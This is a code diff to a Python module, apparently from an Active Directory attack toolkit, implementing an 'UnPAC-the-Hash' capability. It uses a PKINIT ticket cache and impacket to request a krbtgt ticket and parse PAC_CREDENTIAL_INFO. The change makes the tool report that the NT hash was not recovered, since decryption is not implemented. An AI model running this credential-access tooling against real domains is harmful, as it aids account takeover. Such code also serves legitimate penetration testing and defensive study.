@@ -1,8 +1,9 @@
-"""UnPAC-the-Hash — recover NT hash from a PKINIT TGT.
+"""UnPAC-the-Hash — inspect PAC credential information from a PKINIT TGT.
 
 After PKINIT with a client certificate, request a service ticket for
-KRBTGT and parse the PAC_CREDENTIAL_INFO buffer to recover the account's
-NT hash. Requires impacket + a working PFX/PEM + a KDC that returns PAC.
+KRBTGT and report whether a PAC_CREDENTIAL_INFO buffer is present. This
+runner does not claim an NT-hash recovery until the credential blob is
+actually decrypted and verified.
 """
 
 from __future__ import annotations
@@ -10,6 +11,8 @@ from __future__ import annotations
 import json
 import logging
 import os
+from collections.abc import Iterator
+from contextlib import contextmanager
 from typing import Any
 
 from rich.console import Console
@@ -24,7 +27,20 @@ console = Console()
 _logger = logging.getLogger(__name__)
 
 
-def _extract_nt_from_pac(pac_data: bytes) -> str | None:
+@contextmanager
+def _temporary_krb5ccname(path: str) -> Iterator[None]:
+    previous = os.environ.get("KRB5CCNAME")
+    os.environ["KRB5CCNAME"] = path
+    try:
+        yield
+    finally:
+        if previous is None:
+            os.environ.pop("KRB5CCNAME", None)
+        else:
+            os.environ["KRB5CCNAME"] = previous
+
+
+def _extract_nt_from_pac(pac_data: bytes) -> dict[str, str] | None:
     from impacket.krb5.pac import PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER, PACTYPE
 
     pac = PACTYPE(pac_data)
@@ -35,8 +51,10 @@ def _extract_nt_from_pac(pac_data: bytes) -> str | None:
                 PAC_CREDENTIAL_INFO(
                     pac_data[info["Offset"] : info["Offset"] + info["cbBufferSize"]]
                 )
-                # Decrypt cred_info["SerializedData"] using the AS session key here.
-                return "<credential-info-blob-present>"
+                return {
+                    "status": "not_recovered",
+                    "reason": "PAC_CREDENTIAL_INFO decryption is not implemented",
+                }
         except Exception:
             _logger.debug("Could not parse PAC credential buffer", exc_info=True)
             continue
@@ -45,7 +63,7 @@ def _extract_nt_from_pac(pac_data: bytes) -> str | None:
 
 @register_capability(
     id="unpac-the-hash",
-    summary="Recover NT hash from a PKINIT-only cert by parsing PAC_CREDENTIAL_INFO",
+    summary="Inspect PAC_CREDENTIAL_INFO from a PKINIT-only cert without claiming hash recovery",
     category="credential-access",
     tags=("pkinit", "unpac", "adcs", "cert-to-hash"),
 )
@@ -96,36 +114,40 @@ class UnpacTheHash:
             raise RuntimeError("PKINIT did not produce a ccache; cannot request PAC.")
 
         # Request TGS for krbtgt using the cache, then parse PAC.
-        os.environ["KRB5CCNAME"] = str(ccache)
-        try:
-            from impacket.krb5 import constants
-            from impacket.krb5.ccache import CCache
-            from impacket.krb5.kerberosv5 import getKerberosTGS
-            from impacket.krb5.types import Principal
+        pac_note: dict[str, str] | str | None
+        with _temporary_krb5ccname(str(ccache)):
+            try:
+                from impacket.krb5 import constants
+                from impacket.krb5.ccache import CCache
+                from impacket.krb5.kerberosv5 import getKerberosTGS
+                from impacket.krb5.types import Principal
 
-            cc = CCache.loadFile(str(ccache))
-            cc.credentials[0]["client"].prettyPrint().decode("ascii")
-            tgt = cc.credentials[0].toTGT()
-            sname = Principal(
-                f"krbtgt/{target.domain.upper()}",
-                type=constants.PrincipalNameType.NT_SRV_INST.value,
-            )
-            tgs, _cipher, _old, _session_key = getKerberosTGS(
-                sname,
-                target.domain.upper(),
-                target.dc_ip,
-                tgt["KDC_REP"],
-                tgt["cipher"],
-                tgt["sessionKey"],
-            )
-            pac_note = _extract_nt_from_pac(bytes(tgs))
-        except Exception as exc:
-            pac_note = f"parse-failed: {exc}"
+                cc = CCache.loadFile(str(ccache))
+                cc.credentials[0]["client"].prettyPrint().decode("ascii")
+                tgt = cc.credentials[0].toTGT()
+                sname = Principal(
+                    f"krbtgt/{target.domain.upper()}",
+                    type=constants.PrincipalNameType.NT_SRV_INST.value,
+                )
+                tgs, _cipher, _old, _session_key = getKerberosTGS(
+                    sname,
+                    target.domain.upper(),
+                    target.dc_ip,
+                    tgt["KDC_REP"],
+                    tgt["cipher"],
+                    tgt["sessionKey"],
+                )
+                pac_note = _extract_nt_from_pac(bytes(tgs))
+            except Exception as exc:
+                pac_note = f"parse-failed: {exc}"
 
         result = {
             "sam": sam,
             "pkinit_ccache": str(ccache),
             "pac_credential_info": pac_note,
+            "status": "recovered"
+            if isinstance(pac_note, dict) and pac_note.get("nt_hash")
+            else "not_recovered",
         }
         out = session.path("unpac.json")
         out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
